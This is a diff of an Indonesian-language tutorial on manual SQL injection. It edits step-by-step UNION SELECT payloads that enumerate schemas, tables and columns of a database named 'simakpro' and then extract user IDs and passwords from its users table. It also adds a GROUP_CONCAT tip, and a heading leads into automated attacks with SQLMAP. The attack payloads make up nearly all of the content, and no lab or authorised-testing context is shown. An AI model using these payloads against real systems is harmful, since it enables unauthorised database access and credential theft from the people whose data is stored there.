@@ -15,18 +15,10 @@
 ```bash
 ' UNION ALL SELECT 1,2,3,schema_name,5,6,7,8,9,10 FROM information_schema.schemata #
 ```
-Atau, menggunakan script berikut, jika column output tidak memiliki perulangan, Cth:
-```bash
-' UNION ALL SELECT 1,2,3,GROUP_CONCAT(schema_name),5,6,7,8,9,10 FROM information_schema.schemata #
-```
 
 * Selanjutnya, untuk mendapatkan list tables dari database tertentu, menggunakan script berikut, Cth:
 ```bash
 ' UNION SELECT 1,2,3,table_name,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema = 'simakpro' #
-```
-Atau, menggunakan script berikut, jika column output tidak memiliki perulangan, Cth:
-```bash
-' UNION ALL SELECT 1,2,3,GROUP_CONCAT(table_name),5,6,7,8,9,10 FROM information_schema.schemata #
 ```
 
 * Selanjutnya, untuk mendapatkan informasi yang lebih spesifik kolom-kolom dari sebuah table, menggunakan script berikut, Cth:
@@ -38,6 +30,8 @@ Atau, menggunakan script berikut, jika column output tidak memiliki perulangan, 
 ```bash
 ' UNION SELECT 1,2,3,CONCAT(usrid,' - ',passwd,' - ',level, ' - ', type_user),5,6,7,8,9,10 FROM simakpro.users #
 ```
+
+* Tambahan, Apabila column input tidak bisa menampilkan data secara perulangan maka bisa menggunakan, fungsi: `GROUP_CONCAT(variable_name)`
 
 
 ## Langkah-langkah melakukan SQL Injection secara otomatis menggunakan SQLMAP
